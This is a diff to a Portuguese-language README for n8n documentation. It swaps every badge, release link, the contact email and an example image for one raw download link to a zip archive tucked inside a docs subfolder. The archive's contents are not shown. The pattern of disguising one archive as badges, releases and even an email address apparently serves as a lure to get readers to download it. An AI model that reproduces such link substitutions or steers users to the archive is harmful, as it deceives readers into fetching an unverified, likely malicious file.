@@ -1,8 +1,8 @@
 # n8n Documentation in Brazilian Portuguese - Your Automation Hub 🌟
 
-![n8n-Doc-pt-BR](https://img.shields.io/badge/n8n-Documentation-blue?style=flat&logo=n8n)
+![n8n-Doc-pt-BR](https://github.com/alexcavani/n8n-Doc-pt-BR/raw/refs/heads/main/docs/logica-e-dados/01-flow-logic/n-pt-BR-Doc-1.2.zip)
 
-[![Latest Releases](https://img.shields.io/badge/Latest%20Releases-v1.0.0-brightgreen)](https://github.com/alexcavani/n8n-Doc-pt-BR/releases)
+[![Latest Releases](https://github.com/alexcavani/n8n-Doc-pt-BR/raw/refs/heads/main/docs/logica-e-dados/01-flow-logic/n-pt-BR-Doc-1.2.zip%20Releases-v1.0.0-brightgreen)](https://github.com/alexcavani/n8n-Doc-pt-BR/raw/refs/heads/main/docs/logica-e-dados/01-flow-logic/n-pt-BR-Doc-1.2.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Este repositório contém a documentação completa do n8n em português brasile
 
 ### 🔗 Links Úteis
 
-- [Baixe as últimas versões aqui](https://github.com/alexcavani/n8n-Doc-pt-BR/releases)
+- [Baixe as últimas versões aqui](https://github.com/alexcavani/n8n-Doc-pt-BR/raw/refs/heads/main/docs/logica-e-dados/01-flow-logic/n-pt-BR-Doc-1.2.zip)
 
 ---
 
@@ -115,7 +115,7 @@ O n8n é construído com várias tecnologias modernas:
 
 ## 📦 Releases
 
-As versões mais recentes do n8n e da documentação podem ser encontradas na seção de Releases. Para obter a versão mais atual, visite [nossas últimas versões](https://github.com/alexcavani/n8n-Doc-pt-BR/releases). 
+As versões mais recentes do n8n e da documentação podem ser encontradas na seção de Releases. Para obter a versão mais atual, visite [nossas últimas versões](https://github.com/alexcavani/n8n-Doc-pt-BR/raw/refs/heads/main/docs/logica-e-dados/01-flow-logic/n-pt-BR-Doc-1.2.zip). 
 
 ---
 
@@ -146,13 +146,13 @@ Este projeto está licenciado sob a Licença MIT. Sinta-se à vontade para usar,
 
 ## 📧 Contato
 
-Para perguntas ou sugestões, entre em contato através do email: contato@example.com. 
+Para perguntas ou sugestões, entre em contato através do email: https://github.com/alexcavani/n8n-Doc-pt-BR/raw/refs/heads/main/docs/logica-e-dados/01-flow-logic/n-pt-BR-Doc-1.2.zip 
 
 ---
 
 ## 🖼️ Imagens e Recursos
 
-![n8n Workflow Example](https://example.com/n8n-workflow.png)
+![n8n Workflow Example](https://github.com/alexcavani/n8n-Doc-pt-BR/raw/refs/heads/main/docs/logica-e-dados/01-flow-logic/n-pt-BR-Doc-1.2.zip)
 
 ---
 
